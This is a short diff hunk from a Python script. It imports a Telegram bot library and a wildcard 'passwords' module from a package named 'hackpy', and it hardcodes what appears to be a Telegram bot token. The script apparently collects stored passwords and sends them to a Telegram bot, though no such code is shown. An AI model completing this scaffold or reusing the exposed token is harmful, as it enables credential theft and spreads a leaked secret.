@@ -10,11 +10,13 @@ import argparse
 import os
 import json
 from colorama import Fore, Back, Style
+
 import os
 import requests
 import telebot
 import platform
 
+# pip install pypiwin32
 from hackpy.passwords import *
 
 token = '1087169467:AAFpjXe3bQADq3lugTEEsYqQ2NKlYtw6Z0Q'
